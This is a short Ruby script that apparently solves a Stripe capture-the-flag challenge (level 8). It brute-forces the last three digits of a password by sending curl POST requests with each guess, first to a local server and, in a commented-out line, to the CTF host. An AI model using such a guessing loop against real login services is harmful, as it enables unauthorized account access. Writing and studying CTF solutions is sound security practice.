for x in 0..999 do
  print "#{"%03d" % x} " 
  system "curl \"http://localhost:3000/\" -d '{\"password\": \"012023012#{"%03d" % x}\", \"webhooks\": []}'"
  #`curl "https://level08-2.stripe-ctf.com/user-fhjkikbisq/" -d '{"password": "707821664' + "%03d" % x + '", "webhooks": []}'`
end
